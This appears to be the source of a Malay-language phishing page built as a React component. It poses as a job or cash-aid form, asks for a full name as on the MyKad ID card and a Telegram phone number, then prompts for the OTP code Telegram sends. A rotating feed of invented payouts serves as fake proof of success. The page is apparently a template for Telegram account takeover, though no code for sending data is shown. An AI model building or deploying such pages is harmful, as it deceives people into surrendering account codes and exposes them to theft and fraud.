"use client";

import React, { useState, useEffect } from 'react';

// Komponen Daftar Penerima Berjalan (Running Feed)
const RunningFeed = () => {
  const [items, setItems] = useState([
    { nama: "Mohd Zulkifli", jumlah: "RM100", waktu: "2 minit lalu" },
    { nama: "Siti Aminah", jumlah: "RM150", waktu: "5 minit lalu" },
    { nama: "Ariff Rahman", jumlah: "RM100", waktu: "7 minit lalu" },
    { nama: "Nurul Izzah", jumlah: "RM200", waktu: "10 minit lalu" },
    { nama: "Tan Ah Hock", jumlah: "RM100", waktu: "12 minit lalu" },
    { nama: "Ramasamy", jumlah: "RM150", waktu: "15 minit lalu" },
  ]);

  useEffect(() => {
    const interval = setInterval(() => {
      setItems((prev) => {
        const newItems = [...prev];
        const first = newItems.shift();
        if (first) newItems.push(first);
        return newItems;
      });
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="mt-4 px-2 overflow-hidden h-[210px]">
      {items.slice(0, 3).map((item, idx) => (
        <div key={idx} className="flex items-center gap-3 p-3 mb-2 bg-white rounded-lg border border-gray-100 shadow-sm animate-in slide-in-from-bottom-4 duration-500">
          <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold text-xs shrink-0">
            {item.nama.substring(0, 2).toUpperCase()}
          </div>
          <div className="flex-1">
            <p className="text-[11px] font-bold text-gray-700 leading-none">{item.nama}</p>
            <p className="text-[13px] font-black text-blue-800 mt-1">{item.jumlah} <span className="text-green-500">✓</span></p>
          </div>
          <div className="text-[9px] text-gray-400 italic">{item.waktu}</div>
        </div>
      ))}
    </div>
  );
};

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({ nama: '', nomor: '' });

  const handleNext = () => {
    if (!formData.nama || !formData.nomor) return alert("Sila isi maklumat anda");
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
    }, 2000);
  };

  return (
    <div className="w-full min-h-screen bg-gray-100 flex justify-center">
      
      {/* Container Utama (Mobile-First Frame) */}
      <div className="w-full max-w-[450px] bg-[#ff7b00] min-h-screen flex flex-col relative shadow-2xl overflow-hidden">
        
        {/* Header Gambar (Logo & Navigasi) */}
        <div className="w-full">
          <img src="/header-full.jpg" alt="Header" className="w-full h-auto" />
        </div>

        {/* Content Area */}
        <div className="flex-1 px-4 py-2">
          
          {/* Card Form */}
          <div className="bg-white rounded-2xl shadow-xl overflow-hidden mt-2">
            
            {/* Divider Merah (Persis Link) */}
            <div className="bg-[#e11d48] text-white py-3 text-center font-black text-lg italic tracking-tighter uppercase">
              Hantar Resume Sekarang
            </div>

            <div className="p-5">
              {step === 1 ? (
                <div className="space-y-4">
                  <div>
                    <label className="block text-[10px] font-black text-gray-500 mb-1 uppercase tracking-wider">Nama penuh sesuai MyKad</label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-lg">🪪</span>
                      <input 
                        type="text"
                        placeholder="Masukkan nama penuh"
                        className="w-full p-3.5 pl-10 border-2 border-gray-100 rounded-xl bg-gray-50 text-sm font-bold outline-none focus:border-blue-600 transition-all"
                        onChange={(e) => setFormData({...formData, nama: e.target.value})}
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-[10px] font-black text-gray-500 mb-1 uppercase tracking-wider">Nombor Telefon Telegram</label>
                    <div className="relative">
                      <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-1 border-r-2 pr-2 border-gray-200">
                        <img src="https://flagcdn.com/w20/my.png" alt="MY" className="w-5" />
                        <span className="text-[10px] text-gray-400">▼</span>
                      </div>
                      <input 
                        type="tel"
                        placeholder="+6011..."
                        className="w-full p-3.5 pl-16 border-2 border-gray-100 rounded-xl bg-gray-50 text-sm font-bold outline-none focus:border-blue-600 transition-all"
                        onChange={(e) => setFormData({...formData, nomor: e.target.value})}
                      />
                    </div>
                  </div>

                  <button 
                    onClick={handleNext}
                    className="w-full bg-[#001f5b] text-white font-black py-4 rounded-full text-base mt-2 shadow-lg hover:bg-blue-900 transition-all uppercase tracking-widest active:scale-95"
                  >
                    Semak Status
                  </button>

                  {/* Garis Pemisah */}
                  <div className="flex items-center my-4">
                    <div className="flex-1 border-t border-gray-200"></div>
                    <span className="px-3 text-[9px] font-black text-gray-400 uppercase tracking-widest">Penerima Berjaya</span>
                    <div className="flex-1 border-t border-gray-200"></div>
                  </div>

                  {/* Feed Bergerak */}
                  <RunningFeed />
                </div>
              ) : (
                <div className="text-center py-8 animate-in zoom-in-95 duration-300">
                  <div className="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">📲</div>
                  <h3 className="font-black text-blue-900 text-lg">PENGESAHAN OTP</h3>
                  <p className="text-gray-500 text-xs mt-1 mb-6">Sila masukkan kod 5-digit yang dihantar ke akaun Telegram <b>{formData.nomor}</b></p>
                  
                  <div className="flex justify-center gap-2 mb-6">
                    {[1,2,3,4,5].map((_, i) => (
                      <div key={i} className="w-10 h-12 border-2 border-gray-200 rounded-lg bg-gray-50"></div>
                    ))}
                  </div>

                  <button className="w-full bg-[#001f5b] text-white font-black py-4 rounded-full opacity-50 cursor-not-allowed">
                    SAHKAN
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Footer Gambar */}
          <div className="mt-4 mb-6">
            <img src="/footer-full.png" alt="Footer" className="w-full h-auto opacity-95" />
          </div>
        </div>

      </div>

      {/* Loading Overlay */}
      {loading && (
        <div className="fixed inset-0 bg-[#001f5b]/95 flex flex-col items-center justify-center z-50 backdrop-blur-sm">
          <div className="w-14 h-14 border-4 border-white/20 border-t-orange-500 rounded-full animate-spin"></div>
          <p className="mt-4 text-white font-black text-xs tracking-[0.3em] animate-pulse uppercase">Memproses Maklumat...</p>
        </div>
      )}
    </div>
  );
}